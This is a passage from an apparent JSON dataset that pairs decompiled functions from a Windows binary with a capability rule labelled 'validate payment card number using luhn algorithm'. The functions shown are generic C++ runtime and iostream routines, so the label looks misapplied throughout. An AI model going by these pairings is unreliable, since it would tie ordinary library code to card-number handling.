iVar1 = *(arg1 + 0x10);\n    *(iVar1 + 0x28) = 0x14010a821;\n    *(iVar1 + 0x30) = 4;\n    *(iVar1 + 0x38) = 0x14010a826;\n    *(iVar1 + 0x40) = 5;\n    return;\n}\n",
        "token_count": 557
    },
    "1400b149": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1490(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    \n    piVar4 = *(arg1 + 0x10);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.1400bc710(0xd0);\n        iVar1 = *0x1401105b0;\n        *(piVar4 + 1) = 0;\n        piVar4[2] = 0;\n        *piVar4 = iVar1 + 0x10;\n        piVar4[3] = 0;\n        *(piVar4 + 4) = 0;\n        piVar4[5] = 0;\n        piVar4[6] = 0;\n        piVar4[7] = 0;\n        piVar4[8] = 0;\n        *(piVar4 + 9) = 0;\n        *(piVar4 + 0x19) = 0;\n        *(arg1 + 0x10) = piVar4;\n    }\n    uVar2 = *0x14010a844;\n    piVar4[3] = 0;\n    piVar4[2] = 0x14010a820;\n    *(piVar4 + 9) = uVar2;\n    piVar3 = *0x14010fdc0;\n    *(piVar4 + 4) = 0;\n    iVar1 = *piVar3;\n    iVar5 = 0;\n    do {\n        *(piVar4 + iVar5 * 2 + 0x4c) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x24);\n    iVar1 = **0x14010fdb0;\n    iVar5 = 0;\n    do {\n        *(piVar4 + iVar5 * 2 + 0x94) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x1a);\n    piVar4[6] = 4;\n    piVar4[5] = 0x14010a82c;\n    piVar4[7] = 0x14010a836;\n    piVar4[8] = 5;\n    return;\n}\n",
        "token_count": 537
    },
    "1400b1ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1ce0(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x140119260;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "1400b1e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1e40(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x1401192c0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400b20e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b20e0(ulong *arg1)\n\n{\n    *arg1 = 0x140119320;\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 49
    },
    "1400b229": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b2290(ulong *arg1)\n\n{\n    *arg1 = 0x140119360;\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 48
    },
    "1400b295": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b2950(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    \n    for (puVar1 = *(arg1 + 0x28); puVar1 != NULL; puVar1 = *puVar1) {\n        (*puVar1[1])(arg2, arg1, *(puVar1 + 2));\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "1400b29f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b29f0(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    int32_t *piVar4;\n    \n    piVar4 = *0x14010fc90;\n    puVar3 = *(arg1 + 0x28);\n    while (puVar3 != NULL) {\n        if (*piVar4 == 0) {\n            iVar2 = *(puVar3 + 0x14);\n            *(puVar3 + 0x14) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = puVar3 + 0x14;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 != 0) break;\n        puVar3 = *puVar3;\n        fcn.1400bc6c0();\n    }\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 230
    },
    "1400b323": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400b3230(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    fcn.1400a59d0(arg1, arg2 + 0xd0);\n    fcn.1400a5b40(arg2 + 0xd0, arg3);\n    fcn.1400b2950(arg2, 1);\n    return arg1;\n}\n",
        "token_count": 89
    },
    "1400b32c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b32c0(int64_t arg1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uchar auStack32 [16];\n    \n    uVar4 = *0x14010e11c;\n    uVar3 = *0x14010e118;\n    uVar2 = *0x14010e114;\n    uVar1 = *0x14010e110;\n    *(arg1 + 0x18) = 0x1002;\n    *(arg1 + 8) = uVar1;\n    *(arg1 + 0xc) = uVar2;\n    *(arg1 + 0x10) = uVar3;\n    *(arg1 + 0x14) = uVar4;\n    fcn.1400a5a00(auStack32);\n    fcn.1400a5b40(arg1 + 0xd0, auStack32);\n    fcn.1400a5ae0(auStack32);\n    return;\n}\n",
        "token_count": 234
    },
    "1400b39a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b39a0(ulong *arg1, ulong noname_1, ulong noname_2, int64_t arg4)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg4 != 0;\n    *arg1 = 0x1401195b0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 101
    },
    "1400b39f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b39f0(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x1401195b0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400b3a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b3a90(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x1401195b0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400b3b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b3b70(ulong *arg1, ulong noname_1, ulong noname_2, int64_t arg4)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg4 != 0;\n    *arg1 = 0x1401195f0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 101
    },
    "1400b3bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b3bc0(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x1401195f0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400b3c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b3c60(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x1401195f0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400b3d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b3d40(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    puVar3 = *(arg1 + 0x10);\n    if (puVar3 == NULL) {\n        puVar3 = fcn.1400bc710(0x90);\n        *(puVar3 + 1) = 0;\n        *puVar3 = 0x1401185e0;\n        puVar3[2] = 0;\n        puVar3[3] = 0;\n        *(puVar3 + 4) = 0;\n        puVar3[5] = 0;\n        puVar3[6] = 0;\n        puVar3[7] = 0;\n        puVar3[8] = 0;\n        *(puVar3 + 9) = 0;\n        *(puVar3 + 0x11) = 0;\n        *(arg1 + 0x10) = puVar3;\n    }\n    puVar3[3] = 0;\n    puVar3[2] = 0x14010a850;\n    *(puVar3 + 4) = 0;\n    *(puVar3 + 9) = 0x2e;\n    *(*(arg1 + 0x10) + 0x49) = 0x2c;\n    iVar1 = **0x14010fdc0;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x4a + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar1 = **0x14010fdb0;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x6e + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x1a);\n    iVar1 = *(arg1 + 0x10);\n    *(iVar1 + 0x28) = 0x14010a851;\n    *(iVar1 + 0x30) = 4;\n    *(iVar1 + 0x38) = 0x14010a856;\n    *(iVar1 + 0x40) = 5;\n    return;\n}\n",
        "token_count": 543
    },
    "1400b410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b4100(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    int64_t *piVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    \n    puVar4 = *(arg1 + 0x10);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.1400bc710(0xd0);\n        *(puVar4 + 1) = 0;\n        *puVar4 = 0x140118600;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        *(puVar4 + 9) = 0;\n        *(puVar4 + 0x19) = 0;\n        *(arg1 + 0x10) = puVar4;\n    }\n    uVar2 = *0x14010a874;\n    puVar4[3] = 0;\n    puVar4[2] = 0x14010a850;\n    *(puVar4 + 9) = uVar2;\n    piVar3 = *0x14010fdc0;\n    *(puVar4 + 4) = 0;\n    iVar1 = *piVar3;\n    iVar5 = 0;\n    do {\n        *(puVar4 + iVar5 * 2 + 0x4c) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x24);\n    iVar1 = **0x14010fdb0;\n    iVar5 = 0;\n    do {\n        *(puVar4 + iVar5 * 2 + 0x94) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x1a);\n    puVar4[6] = 4;\n    puVar4[5] = 0x14010a85c;\n    puVar4[7] = 0x14010a866;\n    puVar4[8] = 5;\n    return;\n}\n",
        "token_count": 521
    },
    "1400b478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b4780(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    uint64_t arg1_00;\n    \n    *(arg1 + 0x20) = *(arg1 + 0x20) | arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg1_00 = arg2;\n    if (arg2 == 0) {\n        return;\n    }\n    fcn.1400bcd60();\n    cVar1 = fcn.1400b8750(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b97f0(arg1_00);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b8a50(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b9af0(arg1_00);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b8990(arg1_00);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b9a30(arg1_00);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 365
    },
    "1400b47a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b47a0(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    \n    cVar1 = fcn.1400b8750(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b97f0(arg2);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b8a50(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b9af0(arg2);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b8990(arg2);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b9a30(arg2);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 266
    },
    "1400b518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b5180(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    uint64_t arg1_00;\n    \n    *(arg1 + 0x20) = *(arg1 + 0x20) | arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg1_00 = arg2;\n    if (arg2 == 0) {\n        return;\n    }\n    fcn.1400bcd60();\n    cVar1 = fcn.1400b87b0(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b9850(arg1_00);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b8ab0(arg1_00);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b9b50(arg1_00);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b89f0(arg1_00);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b9a90(arg1_00);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 366
    },
    "1400b51a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b51a0(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    \n    cVar1 = fcn.1400b87b0(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b9850(arg2);\n    }\n    *(arg1 + 0xf0) = uVar2;\n    cVar1 = fcn.1400b8ab0(arg2);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.1400b9b50(arg2);\n    }\n    *(arg1 + 0xf8) = uVar2;\n    cVar1 = fcn.1400b89f0(arg2);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.1400b9a90(arg2);\n        *(arg1 + 0x100) = uVar2;\n        return;\n    }\n    *(arg1 + 0x100) = 0;\n    return;\n}\n",
        "token_count": 267
    },
    "1400b66d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.1400b66d0(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint8_t *puVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    \n    puVar3 = sub.msvcrt.dll_setlocale(4, 0);\n    uVar1 = *puVar3 - 0x43;\n    if (uVar1 == 0) {\n        uVar1 = puVar3[1];\n    }\n    if (uVar1 == 0) {\n        uVar2 = fcn.140015aa0(arg2, arg3, arg4, &stack0x00000028);\n        return uVar2;\n    }\n    iVar4 = sub.msvcrt.dll_strlen(puVar3);\n    uVar5 = fcn.1400bc6e0(iVar4 + 1);\n    sub.msvcrt.dll_memcpy(uVar5, puVar3, iVar4 + 1);\n    sub.msvcrt.dll_setlocale(4, 0x14010af87);\n    uVar2 = fcn.140015aa0(arg2, arg3, arg4, &stack0x00000028);\n    sub.msvcrt.dll_setlocale(4, uVar5);\n    fcn.1400bc6b0(uVar5);\n    return uVar2;\n}\n",
        "token_count": 314
    },
    "1400b6f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.1400b6f90(char **arg1, uint16_t *arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int16_t iVar4;\n    uint16_t uVar5;\n    int64_t *piVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint64_t arg2_00;\n    uint16_t *puVar9;\n    int64_t iVar10;\n    uint64_t arg3_00;\n    int64_t iVar11;\n    uchar auStack88 [7];\n    uint8_t uStack81;\n    uchar auStack80 [16];\n    \n    arg3_00 = 0;\n    fcn.140092730(&uStack81, arg1, 0);\n    uVar8 = uStack81;\n    pcVar7 = *arg1;\n    if (uStack81 == 0) {\ncode_r0x0001400b7123:\n        uVar8 = 4;\n    }\n    else {\n        iVar11 = *(arg1 + *(pcVar7 + -0x18) + 0x10);\n        if ((iVar11 < 1) || (arg3 <= iVar11)) {\n            iVar11 = arg3;\n        }\n        fcn.1400a59d0(auStack80, arg1 + *(pcVar7 + -0x18) + 0xd0);\n        piVar6 = fcn.1400b9850(auStack80);\n        fcn.1400a5ae0(auStack80);\n        piVar1 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n        if (piVar1[2] < piVar1[3]) {\n            uVar5 = *piVar1[2];\n        }\n        else {\n            uVar5 = (**(*piVar1 + 0x48))(piVar1);\n        }\n        iVar11 = iVar11 + -1;\n        if (iVar11 < 1) {\n            uVar8 = uVar5 == 0xffff;\n        }\n        else if (uVar5 != 0xffff) {\n            iVar10 = 0;\n            do {\n                arg3_00 = uVar5;\n                cVar3 = (**(*piVar6 + 0x10))(piVar6, 0x20);\n                if (cVar3 != '\\0') {\n                    pcVar7 = *arg1;\n                    *arg2 = 0;\n                    *(arg1 + *(pcVar7 + -0x18) + 0x10) = 0;\n                    if (iVar10 != 0) {\n                        return pcVar7;\n                    }\n                    goto code_r0x0001400b7123;\n                }\n                puVar9 = arg2 + 1;\n                piVar2 = piVar1[2];\n                iVar10 = iVar10 + 1;\n                *arg2 = uVar5;\n                if (piVar2 < piVar1[3]) {\n                    iVar4 = *piVar2;\n                    piVar1[2] = piVar2 + 1;\n                }\n                else {\n                    iVar4 = (**(*piVar1 + 0x50))(piVar1);\n                }\n                if (iVar4 == -1) {\n                    uVar8 = iVar10 < iVar11;\n                    goto code_r0x0001400b70d0;\n                }\n                if (piVar1[2] < piVar1[3]) {\n                    uVar5 = *piVar1[2];\n                }\n                else {\n                    uVar5 = (**(*piVar1 + 0x48))(piVar1);\n                }\n                if (iVar10 == iVar11) {\n                    uVar8 = uVar5 == 0xffff;\n                    break;\n                }\n                arg2 = puVar9;\n            } while (uVar5 != 0xffff);\n            uVar8 = iVar10 < iVar11 & uVar8;\ncode_r0x0001400b70d0:\n            *puVar9 = 0;\n            pcVar7 = *arg1;\n            *(arg1 + *(pcVar7 + -0x18) + 0x10) = 0;\n            if (uVar8 == 0) {\n                return pcVar7;\n            }\n            uVar8 = 2;\n            goto code_r0x0001400b7128;\n        }\n        pcVar7 = *arg1;\n        *arg2 = 0;\n        *(arg1 + *(pcVar7 + -0x18) + 0x10) = 0;\n        uVar8 = (0 < iVar11 & uVar8) * 2 | 4;\n    }\ncode_r0x0001400b7128:\n    iVar11 = *(pcVar7 + -0x18);\n    uVar8 = uVar8 | *(arg1 + iVar11 + 0x20);\n    if (*(arg1 + iVar11 + 0xe8) == 0) {\n        uVar8 = uVar8 | 1;\n    }\n    *(arg1 + iVar11 + 0x20) = uVar8;\n    uVar8 = uVar8 & *(arg1 + iVar11 + 0x1c);\n    arg2_00 = uVar8;\n    if (uVar8 != 0) {\n        pcVar7 = \"basic_ios::clear\";\n        fcn.1400bd8d0(\"basic_ios::clear\");\n        fcn.1400a59d0(pcVar7, arg2_00 + 0xd0);\n        fcn.1400b3230(auStack88, arg2_00, arg3_00);\n        fcn.1400a5ae0(auStack88);\n        fcn.1400b51a0(arg2_00, arg3_00);\n        piVar1 = *(arg2_00 + 0xe8);\n        if (piVar1 != NULL) {\n            fcn.1400a59d0(auStack88, piVar1 + 7);\n            (**(*piVar1 + 0x10))(piVar1, arg3_00);\n            fcn.1400a5b40(piVar1 + 7, arg3_00);\n            fcn.1400a5ae0(auStack88);\n        }\n        return pcVar7;\n    }\n    return pcVar7;\n}\n",
        "token_count": 1414
    },
    "1400b767": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b7670(ulong noname_0, ulong noname_1, ulong *arg3)\n\n{\n    fcn.1400b79d0(noname_0, noname_1, *arg3, arg3[1]);\n    return;\n}\n",
        "token_count": 62
    },
    "1400b76c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400b76c0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1400bcb60();\n    return *(iVar1 + 8) & 0xffffff00 | *(iVar1 + 8) != 0;\n}\n",
        "token_count": 64
    },
    "1400b805": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b8050(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_bp_20h;\n    ulong var_28h;\n    \n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.1400b76e0(&uStackX8);\n    fcn.1400b5d40(uStackX8, uStackX16);\n    return;\n}\n",
        "token_count": 108
    },
    "1400ba74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400ba740(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    ulong var_10h;\n    ulong var_18h;\n    ulong var_20h;\n    \n    uVar1 = fcn.1400a7cd0(arg2, arg3);\n    uVar1 = fcn.1400b8000(uVar1);\n    fcn.1400a9570(arg1, uVar1);\n    return arg1;\n}\n",
        "token_count": 110
    },
    "1400bc68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400bc680(int64_t *arg1)\n\n{\n    ulong var_10h;\n    \n    if (*arg1 != 0) {\n        fcn.1400a6b20(*arg1);\n    }\n    return;\n}\n",
        "token_count": 55
    },
    "1400bc6f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400bc6f0(ulong arg1)\n\n{\n    fcn.1400bc6e0(arg1);\n    return;\n}\n",
        "token_count": 34
    },
    "1400bcb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.1400bcb80(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    ulong *arg1_00;\n    uchar *arg1_01;\n    ulong uVar4;\n    char *pcVar5;\n    uint64_t in_RDX;\n    ulong in_R8;\n    \n    puVar1 = *0x14010fc90;\n    *(arg1 + 1) = 0;\n    pcVar3 = *puVar1;\n    if (*puVar1 != 0) {\n        pcVar5 = *0x140107c20;\n        pcVar3 = fcn.140014b10(*0x140107c20);\n        if (pcVar3 != 0) {\n            fcn.140021df0();\n            puVar1 = *0x14010fc90;\n            if (*pcVar5 == '\\0') {\n                pcVar3 = **0x14010fc90;\n                if (**0x14010fc90 == 0) {\n                    if (*pcVar5 == '\\0') {\n                        if (pcVar5[1] != '\\0') {\ncode_r0x0001400bcc8c:\n                            arg1_01 = fcn.1400bd890();\n                            if (*puVar1 != 0) {\n                                iVar2 = fcn.140014b10(*0x140107c20);\n                                if (iVar2 != 0) {\n                                    fcn.140021df0();\n                                }\n                            }\n                            fcn.140014f30(arg1_01);\n                            arg1_01[1] = 0;\n                            *arg1_01 = 1;\n                            pcVar3 = **0x14010fc90;\n                            if (**0x14010fc90 != 0) {\n                                pcVar5 = *0x140107c20;\n                                pcVar3 = fcn.140014b10(*0x140107c20);\n                                if (pcVar3 != 0) {\n                                    fcn.140021df0();\n                                    *(pcVar5 + -0xa0) = 0;\n                                    *(pcVar5 + -0x90) = in_RDX;\n                                    *(pcVar5 + -0x88) = in_R8;\n                                    uVar4 = fcn.1400b6680();\n                                    *(pcVar5 + -0x80) = uVar4;\n                                    uVar4 = fcn.1400b60b0();\n                                    *(pcVar5 + -0x78) = uVar4;\n                                    *(pcVar5 + -0x40) = 0x474e5543432b2b00;\n                                    *(pcVar5 + -0x38) = 0x14001f5b0;\n                                    return pcVar5 + -0xa0;\n                                }\n                            }\n                            return pcVar3;\n                        }\ncode_r0x0001400bcbf0:\n                        pcVar5[1] = '\\x01';\n                        pcVar3 = 0x1;\n                    }\n                    return pcVar3;\n                }\n                fcn.1400147f0(0x140109370, 0x140020330);\n                in_RDX = *puVar1;\n                pcVar3 = *0x140107c20;\n                if (*puVar1 != 0) goto code_r0x0001400bcc30;\n                if (*pcVar5 == '\\0') {\n                    do {\n                        if (pcVar5[1] == '\\0') goto code_r0x0001400bcbf0;\n                        fcn.1400bd890();\ncode_r0x0001400bcc30:\n                        iVar2 = fcn.140014a50(pcVar3);\n                        if (iVar2 != 0) {\n                            arg1_00 = fcn.1400bc7f0(8);\n                            in_R8 = 0x140021a20;\n                            in_RDX = 0x1401118e0;\n                            *arg1_00 = 0x140116310;\n                            fcn.1400bcdb0(arg1_00, 0x1401118e0, 0x140021a20);\n                            goto code_r0x0001400bcc87;\n                        }\n                    } while (*pcVar5 == '\\0');\n                    if (*puVar1 != 0) {\n                        iVar2 = fcn.140014b10(*0x140107c20);\n                        if (iVar2 != 0) {\ncode_r0x0001400bcc87:\n                            fcn.140021df0();\n                            goto code_r0x0001400bcc8c;\n                        }\n                    }\n                }\n            }\n            return NULL;\n        }\n    }\n    return pcVar3;\n}\n",
        "token_count": 1036
    },
    "1400bccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400bccc0(uchar *arg1)\n\n{\n    uint64_t uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong in_RDX;\n    ulong in_R8;\n    \n    arg1[1] = 0;\n    *arg1 = 1;\n    uVar1 = **0x14010fc90;\n    if (**0x14010fc90 != 0) {\n        iVar3 = *0x140107c20;\n        uVar1 = fcn.140014b10(*0x140107c20);\n        if (uVar1 != 0) {\n            fcn.140021df0();\n            *(iVar3 + -0xa0) = 0;\n            *(iVar3 + -0x90) = in_RDX;\n            *(iVar3 + -0x88) = in_R8;\n            uVar2 = fcn.1400b6680();\n            *(iVar3 + -0x80) = uVar2;\n            uVar2 = fcn.1400b60b0();\n            *(iVar3 + -0x78) = uVar2;\n            *(iVar3 + -0x40) = 0x474e5543432b2b00;\n            *(iVar3 + -0x38) = 0x14001f5b0;\n            return iVar3 - 0xa0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 319
    },
    "1400bcd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
